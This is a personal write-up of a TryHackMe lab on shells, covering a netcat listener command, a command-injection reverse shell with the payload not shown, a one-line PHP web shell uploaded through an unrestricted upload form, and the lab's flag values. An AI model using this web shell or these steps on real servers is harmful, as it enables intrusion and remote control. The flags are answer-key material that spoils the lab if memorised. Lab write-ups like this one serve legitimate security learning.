TryHackMe - Shells (writeup)

I just finished the Shells Overview practical lab on TryHackMe! This room covers the exact moments an attacker successfully
breaks into a vulnerable server and sets up remote control.

Here is what I learned and executed in simple terms:

    1. Command Injection & Reverse Shell (Flag 1)
    
The Concept: A reverse shell forces the target server to connect back to my machine. This easily bypasses strict network firewalls.

What I Did: First, I fired up a Netcat listener on my terminal (nc -lvnp 4444). Then, I found a command injection bug on port 8081 
and injected a custom Linux pipe payload using my own VPN IP.

The Win: The server instantly called back to my terminal! I got a direct bash terminal, navigated to the root directory (cd /), and
snagged Flag 1 (THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}).

    2. Unrestricted File Upload & Web Shell (Flag 2)
    
The Concept: A web shell is a stealthy script (like PHP) uploaded to a server that allows you to execute commands directly through a web browser URL.

What I Did: I found a broken upload form on port 8082. I uploaded a tiny script named exploit.php containing <?php system($_GET['cmd']); ?>.

The Win: I triggered the backdoor straight from my browser by typing ?cmd=cat /flag.txt at the end of the URL. The screen printed
Flag 2 (THM{202bb14ed12120b31300cfbbbdd35998786b44e5}) instantly without even needing Netcat!

    Takeaways

IP Confusion: I learned the hard way that in a reverse shell, you must pass your own attacker IP, not the target IP, because the server 
needs to know the path back to your machine.

Fixing Mistakes: Securing inputs against command injection and strictly validating uploaded file extensions are critical to stopping hackers
from grabbing a shell.
